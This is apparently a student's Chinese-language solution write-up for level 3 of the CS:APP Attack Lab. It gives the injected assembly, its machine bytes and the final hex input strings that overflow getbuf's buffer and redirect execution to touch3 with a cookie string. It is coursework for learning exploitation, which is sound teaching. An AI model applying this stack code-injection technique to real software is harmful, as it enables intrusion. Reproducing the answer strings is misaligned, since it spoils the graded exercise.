### 思路

- **level3简要说明**

    本题思路类似level2，只不过传回的是cookie的字符串形式的地址指针.

- **解题过程**
  
    观察了touch3(str)的汇编源码，hexmatch(cookie,str)中的cookie不用我们设置，这句

    ```py
    mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
    ```

    将hexmatch(cookie,str)的第一个参数设置好了，我们只需要保证我们的注入代码中有对<strong> %rdi </strong>修改即可，且<strong> %rdi </strong>指向cookie的字符串格式的首地址，那么**level3的关键点就是在何处存储cookie的字符串格式**.

    ```py
    cookie : 0x59b997fa
    (str) cookie : "59b997fa"
    (str in memory) : 0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 
    ```

    如果我们希望getbuf()的buf区同level2那样作为代码注入区，那么目标字符串就要换个位置存储，而test()中刚好分配了8个字节(虽说会多出一个'\0'，不过我们不会从test()中返回，所以test()栈帧中的返回地址被破坏也是无关紧要的)

- **注入代码实现**

    有了上述的解题过程思路，我们编写出注入代码的汇编形式

    ```py
    # 优化前，爆40个字节了
    movq   %rsp,%rsi  # let rsi to address which for "59b997fa" str make
    movb   $0x35,(%rsi)   # ascii of '5'
    movb   $0x39,1(%rsi)  # ascii of '9'
    movb   $0x62,2(%rsi)  # ascii of 'b'
    movb   $0x39,3(%rsi)  # ascii of '9' 
    movb   $0x39,4(%rsi)  # ascii of '9'
    movb   $0x37,5(%rsi)  # ascii of '7'  
    movb   $0x66,6(%rsi)  # ascii of 'f'
    movb   $0x61,7(%rsi)  # ascii of 'a'
    movb   $0x00,8(%rsi)  # ascii of '\0'
    movq   %rsi,%rdi      # make %rdi as argument for touch3(str)
    pushq  $0x4018fa      # make touch() be the return address
    ret

    # 优化后
    movq   %rsp,%rsi            # 当前%rsp就是指向test的栈空间了，注意
    movl   $0x39623935,(%rsi)   # ascii of "59b9"，注意高位放高位
    movl   $0x61663739,4(%rsi)  # ascii of "97fa"
    movb   $0x00,8(%rsi)        # ascii of "\0"
    movq   %rsi,%rdi      # make %rdi as argument for touch3(str)
    pushq  $0x4018fa      # make touch() be the return address
    ret
    ```

    反汇编后得到机器级指令

    ```py
       0000000000000000 <.text>:
      0:	48 89 e6             	mov    %rsp,%rsi
      3:	c7 06 35 39 62 39    	movl   $0x39623935,(%rsi)
      9:	c7 46 04 39 37 66 61 	movl   $0x61663739,0x4(%rsi)
     10:	c6 46 08 00          	movb   $0x0,0x8(%rsi)
     14:	48 89 f7             	mov    %rsi,%rdi
     17:	68 fa 18 40 00       	push   $0x4018fa
     1c:	c3                   	ret   
    ```

- **最终答案**

    ```txt
        48 89 e6 c7 06 35 39 62 
        39 c7 46 04 39 37 66 61
        c6 46 08 00 48 89 f7 68 
        fa 18 40 00 c3 00 00 00
        00 00 00 00 00 00 00 00
        78 dc 61 55 00 00 00 00
    ```

- **更简单的思路**
  直接在ctarget3.txt中存放在Test()栈空间中的字符串，那么新的注入汇编代码如下

  ```py
    movq %rsp,%rdi # 设置touch3()的参数
    pushq  $0x4018fa      # make touch() be the return address
    ret
  ```

  ```py
    48 89 e7 68 fa 18 40 00 
    c3 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    78 dc 61 55 00 00 00 00
    35 39 62 39 39 37 66 61
    # 注意返回地址是8bytes，不要在55后直接接字符串
  ```